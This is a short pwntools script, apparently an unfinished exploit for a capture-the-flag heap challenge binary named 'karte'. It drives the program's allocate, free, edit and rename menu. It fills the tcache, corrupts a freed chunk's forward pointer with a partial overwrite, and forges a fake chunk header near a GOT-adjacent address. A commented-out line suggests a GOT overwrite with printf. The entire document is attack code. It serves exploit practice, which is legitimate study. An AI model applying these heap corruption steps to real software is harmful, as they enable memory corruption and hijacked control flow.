from pwn import *

e = ELF("./karte")
libc = ELF("./libc.so.6")

p = process(e.path)

p.recvuntil("name")
p.sendline("AAAA")

p.recvuntil(">")

def alloc(size, data="AAAA"):
  p.sendline("1")
  p.sendlineafter(">", str(size))
  p.sendafter(">", data)
  
  p.recvuntil("id ")
  ret = p.recvline(keepends=False)

  p.recvuntil(">")

  return ret

def free(idx):
  p.sendline("3")
  p.sendlineafter(">", idx)
  p.recvuntil(">")

def rename(data):
  p.sendline("99")
  p.sendlineafter("...", data)
  p.recvuntil(">")

for i in range(7):
  free(alloc(0x60))

A = alloc(0x60)
B = alloc(0x60)
free(B)
free(A)

print(A)

p.sendline("4")
p.sendlineafter(">", A)
p.sendlineafter(">", p64(0x6021a0)[:3])
p.recvuntil(">")

rename(p64(0) + p64(0x71) + p64(0x602000 - 0x13))

A = alloc(0x60)
C = alloc(0x60)
gdb.attach(p)
#B = alloc(0x60, "AAA")
#"A" * 3 + p64(0x601e2) + p64(0) * 2 + p64(e.symbols["printf"]))


p.interactive()
